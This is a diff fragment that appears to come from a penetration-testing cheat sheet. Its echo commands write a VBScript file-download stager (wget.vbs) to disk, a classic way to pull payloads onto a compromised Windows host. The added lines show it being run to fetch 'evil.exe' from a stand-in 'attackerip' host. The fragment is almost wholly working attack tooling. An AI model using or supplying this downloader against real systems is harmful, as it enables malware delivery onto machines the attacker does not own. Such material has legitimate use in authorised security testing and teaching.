@@ -23,3 +23,7 @@ echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
 echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
 echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
+
+#   cscript wget.vbs http://attackerip/evil.exe evil.exe                  
+                    
+                    
